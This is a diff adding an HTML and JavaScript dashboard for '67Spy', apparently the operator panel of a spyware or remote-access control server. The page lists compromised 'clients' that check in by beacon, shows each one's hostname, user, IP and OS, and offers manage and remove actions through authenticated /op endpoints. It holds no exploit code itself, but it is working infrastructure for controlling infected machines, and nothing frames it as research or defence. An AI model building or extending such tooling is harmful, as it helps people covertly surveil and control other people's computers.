@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>67Spy — Dashboard</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<nav class="navbar">
+  <div class="nav-brand">67SPY</div>
+  <div class="nav-right">
+    <span id="client-count" class="badge">0 clients</span>
+    <a href="/logout" class="nav-link">Logout</a>
+  </div>
+</nav>
+
+<div class="page-wrap">
+  <div class="page-header">
+    <h2>Active Clients</h2>
+    <button class="btn-sm" onclick="fetchClients()">↻ Refresh</button>
+  </div>
+
+  <div id="client-table-wrap">
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>Status</th>
+          <th>Hostname</th>
+          <th>User</th>
+          <th>IP</th>
+          <th>OS</th>
+          <th>Last Seen</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody id="client-tbody">
+        <tr><td colspan="7" class="empty">No clients yet. Waiting for beacons…</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<script>
+const TOKEN = '{{ session.token }}';
+
+function reltime(ts) {
+  const d = Math.floor(Date.now()/1000 - ts);
+  if (d < 60)  return d + 's ago';
+  if (d < 3600) return Math.floor(d/60) + 'm ago';
+  return Math.floor(d/3600) + 'h ago';
+}
+
+async function fetchClients() {
+  const r = await fetch('/op/clients', {headers: {'Authorization': 'Bearer ' + TOKEN}});
+  if (!r.ok) return;
+  const clients = await r.json();
+  document.getElementById('client-count').textContent = clients.length + ' client' + (clients.length !== 1 ? 's' : '');
+  const tbody = document.getElementById('client-tbody');
+  if (!clients.length) {
+    tbody.innerHTML = '<tr><td colspan="7" class="empty">No clients yet. Waiting for beacons…</td></tr>';
+    return;
+  }
+  tbody.innerHTML = clients.map(c => `
+    <tr class="client-row" onclick="window.location='/client/${c.uuid}'">
+      <td><span class="dot ${c.online ? 'dot-green' : 'dot-red'}"></span>${c.online ? 'Online' : 'Offline'}</td>
+      <td class="mono">${esc(c.hostname || '?')}</td>
+      <td class="mono">${esc(c.username || '?')}</td>
+      <td class="mono muted">${esc(c.ip || '?')}</td>
+      <td class="muted">${esc(c.os_info ? c.os_info.substring(0,40) : '?')}</td>
+      <td class="muted">${reltime(c.last_seen)}</td>
+      <td onclick="event.stopPropagation()">
+        <a href="/client/${c.uuid}" class="action-link">Manage</a>
+        <button class="action-btn danger" onclick="deleteClient('${c.uuid}')">✕</button>
+      </td>
+    </tr>`).join('');
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+async function deleteClient(uuid) {
+  if (!confirm('Remove this client?')) return;
+  await fetch('/op/delete/' + uuid, {method: 'DELETE', headers: {'Authorization': 'Bearer ' + TOKEN}});
+  fetchClients();
+}
+
+fetchClients();
+setInterval(fetchClients, 5000);
+</script>
+</body>
+</html>
